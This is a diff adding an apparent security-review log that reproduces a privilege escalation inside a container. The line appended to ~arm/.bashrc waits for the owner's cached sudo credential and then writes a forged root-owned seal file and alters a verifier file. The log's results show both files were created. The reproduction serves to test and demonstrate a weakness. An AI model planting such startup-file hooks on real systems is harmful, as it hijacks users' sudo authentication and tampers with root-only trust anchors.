@@ -1,0 +1,20 @@
+== review sudo reproduction 2026-11-28T00:15:56Z host=streamanator user=arm image r7rev-sudo:1 (base sha256:d71c0b286c54a7cc48645aa8d4d9d0c57e4260128cb91a6fb18c29d7589205ba + sudo python3; network in the build only)
+sudo: unable to resolve host r7rev-rehearsal: Temporary failure in name resolution
+sudo: unable to resolve host r7rev-rehearsal: Temporary failure in name resolution
+[REAL] Ubuntu 24.04.4 LTS; Sudo version 1.9.15p5; timestamp_type: Authentication timestamp timeout: 15.0 minutes;Path to authentication timestamp dir: /run/sudo/ts;Type of authentication timestamp record: tty;
+[FIXTURE] uid=1001(arm) gid=1001(arm) groups=1001(arm),27(sudo); sudoers default (%sudo ALL=(ALL:ALL) ALL), password required: sudo: unable to resolve host r7rev-rehearsal: Temporary failure in name resolution
+[FIXTURE] root-only targets: root:root 755 /var/lib/afldb-backup/seals;root:root 755 /usr/local/lib/afldb-verify;
+[ARM] as arm, before: touch in seals -> touch: cannot touch '/var/lib/afldb-backup/seals/x': Permission denied
+[ARM] appended to ~arm/.bashrc (owner arm): fi|( while ! sudo -n true 2>/dev/null; do sleep 0.2; done|  sudo -n sh -c 'id > /var/lib/afldb-backup/seals/FORGED-BY-ARM-BASHRC.seal; echo "# appended by arm via bashrc" >> /usr/local/lib/afldb-verif
+[OWNER] terminal transcript of the owner session (one sudo command, his own):
+   | sudo systemctl --version | head -1
+   | sudo: unable to resolve host r7rev-rehearsal: Temporary failure in name resolution
+   | [sudo] password for arm: 
+   | sudo: systemctl: command not found
+   | arm@r7rev-rehearsal:~$ exit
+   | logout
+[RESULT] seals/: -rw-r--r-- 1 root root 39 Nov 28 00:16 FORGED-BY-ARM-BASHRC.seal;
+[RESULT] FORGED file content: uid=0(root) gid=0(root) groups=0(root)
+[RESULT] verifier bundle: -rw-r--r-- 1 root root 29 Nov 28 00:16 afldb-verify-dispatch; # appended by arm via bashrc
+REVIEW-SUDO RESULT REPRODUCED: a uid-arm startup file obtained root from the owner's own sudo authentication and wrote root-only trust anchors
+left: containers 0 images 0 workspace removed
